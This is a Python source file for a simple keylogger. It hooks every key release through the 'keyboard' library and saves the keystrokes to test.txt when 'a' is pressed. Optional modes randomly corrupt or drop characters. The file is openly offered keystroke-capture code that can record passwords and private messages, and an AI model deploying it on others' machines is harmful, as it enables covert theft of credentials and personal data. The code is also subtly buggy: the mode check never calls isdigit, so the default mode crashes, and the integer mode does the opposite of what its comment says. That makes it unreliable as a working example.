import os
import keyboard
import sys
import random

class Keylogger:
    mode = []
    logged = ""

    # Initialize mode from command lien
    def __init__(self, mode):
        self.mode = mode

    # Format output string so that it isn't one long line
    def create_output_string(self):
        i = 0
        # Iterate through characters in string
        for _ in self.logged:
            i += 1
            # every 64 characters put a new line
            if i % 64 == 0:
                self.logged = self.logged[:i] + "\n" + self.logged[i:]
    
    # Writes the logged keypresses to file: currently .\test.txt
    def write(self):
        self.create_output_string()
        with open("test.txt", "w") as file:
            file.write(self.logged)
    
    # Starts listening for keypresses
    def start(self):
        # Calls key_pressed and passes event when key is released
        keyboard.on_release(callback=self.key_pressed)
        keyboard.wait()
        return

    def simulated_key_pressed(self, key):
        # Random mode, each character has a 10% chance of being a random character, rather than the one pressed
        if self.mode == "random":
            if random.randint(1, 10) == 1:
                # Creates random character from range of ascii values for standard keyboard operations
                rand_char = chr(random.randint(32, 126))
                self.logged += rand_char
            # case where 90% chance of correct logging is hit
            else:
                self.logged += key
        # If mode is a number then there is a 1/mode chance each character will be dropped
        elif self.mode.isdigit:
            if random.randint(1, int(self.mode)) == 1:
                self.logged += key
        else:
            self.logged += key


    # Handles different mode operations and adds appropriate character to log
    def key_pressed(self, event):
        # Random mode, each character has a 10% chance of being a random character, rather than the one pressed
        if self.mode == "random":
            if random.randint(1, 10) == 1:
                # Creates random character from range of ascii values for standard keyboard operations
                rand_char = chr(random.randint(32, 126))
                self.logged += rand_char
            # case where 90% chance of correct logging is hit
            else:
                self.logged += event.name
        # If mode is a number then there is a 1/mode chance each character will be dropped        
        elif self.mode.isdigit:
            if random.randint(1, int(self.mode)) == 1:
                self.logged += event.name
        else:
            self.logged += event.name
        # Writes to file when you press "a"
        if event.name == "a":
            self.write()

# To run, navigate to directory in command line and use 'python keylogger.py [mode]'
# [MODE OPTIONS]
# "random" --- Each character logged has a 1/10 chance to be wrong
# <INTEGER> --- Whatever integer you enter there will be a 1/INTEGER chance for each keypress to be dropped
# <NONE> --- Records every keypress as expected
#
# NOTE: Currently the only way to stop keylogging is pressing CTRL+C in terminal
# NOTE: You must press "a" last to write to fill
if __name__ == '__main__':
    if len(sys.argv) > 1:
        mode = sys.argv[1]
    else:
        mode = None
    k1 = Keylogger(mode)
    k1.start()
    